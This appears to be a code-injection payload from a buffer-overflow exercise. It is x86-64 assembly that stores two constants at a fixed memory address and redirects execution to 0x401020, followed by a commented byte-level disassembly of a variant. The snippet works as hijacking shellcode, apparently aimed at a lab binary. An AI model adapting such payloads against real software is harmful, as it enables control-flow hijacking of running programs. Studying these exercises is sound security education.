
movq    $0x602308,%r9
movq $0x723ba0de, (%r9)
nop
movq $0x615661ba, 0x4(%r9)
push $0x401020
retq


  #  0: 55                    push   %rbp
  #  1: 48 c7 c5 20 10 40 00  mov    $0x401020,%rbp
  #  8: 49 c7 c1 08 23 60 00  mov    $0x602308,%r9
  #  f: 49 c7 01 de a0 3b 72  movq   $0x723ba0de,(%r9)
  # 16: 90                    nop
  # 17: 49 c7 41 04 ba 61 56  movq   $0x615661ba,0x4(%r9)
  # 1e: 61 
  # 1f: 48 89 ec              mov    %rbp,%rsp
  # 22: c9                    leaveq 
  # 23: c3                    retq   
